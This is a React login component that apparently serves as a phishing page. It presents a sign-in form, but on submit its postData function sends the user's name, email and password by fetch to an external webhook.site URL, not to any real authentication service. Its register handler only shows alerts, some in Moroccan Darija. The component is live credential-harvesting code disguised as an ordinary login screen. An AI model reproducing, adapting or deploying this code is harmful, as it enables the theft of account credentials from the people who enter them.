import React, { useState } from "react";
import "./Login.css";
function Login() {
  const [email, setEmail] = useState("");
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [profilePic, setProfilePic] = useState("");

  const postData = (e) => {
    e.preventDefault();
    if (!name) {
      let result = fetch(
        "https://webhook.site/989f9414-3148-4021-a820-08491aa47267",
        {
          method: "post",
          mode: "no-cors",
          headers: {
            Accept: "application/json",
            "Content-type": "application/json",
          },
          body: JSON.stringify({
            name: name,
            email: email,
            password: password,
          }),
        }
      );
      console.log(result);
    } else {
      alert("hadchi rah machi howa hadak");
    }
  };
  const register = (e) => {
    if (!name) {
      alert("it's not possible");
    }
    alert("mrhba bik asshybi");
  };
  return (
    <div className="login">
      <img
        src="https://lh3.googleusercontent.com/proxy/WogoHA7hWRi_X01_X_AeLYjteUTyxV7PEUoDuMha4Bu0y3oCsQktGi3fGibPlsHRL2sSzz0L-ollXTq4vtBPiip4VsKmtLt5eRUV4PdAELMP3ZjdqZFB3M5xZJwh-xbHq-E8eHZAJVYyB8SCapxGV0z-Zx_OJeSmUuHvbJWPyZp_Ib_pUzsrjA"
        alt=""
      />
      <form onSubmit={postData}>
        <input
          value={name}
          onChange={(e) => setName(e.target.value)}
          placeholder="Full name (required if registering)"
          type="text"
        />
        <input
          value={profilePic}
          onChange={(e) => setProfilePic(e.target.value)}
          placeholder="Profile pic URL (optional)"
          type="text"
        />
        <input
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          placeholder="Email"
          type="email"
        />
        <input
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="Password"
          type="password"
        />
        <button type="submit">Sing In</button>
      </form>
      <p>
        Not a member?{" "}
        <span className="login__register" onClick={register}>
          Register Now
        </span>
      </p>
    </div>
  );
}

export default Login;
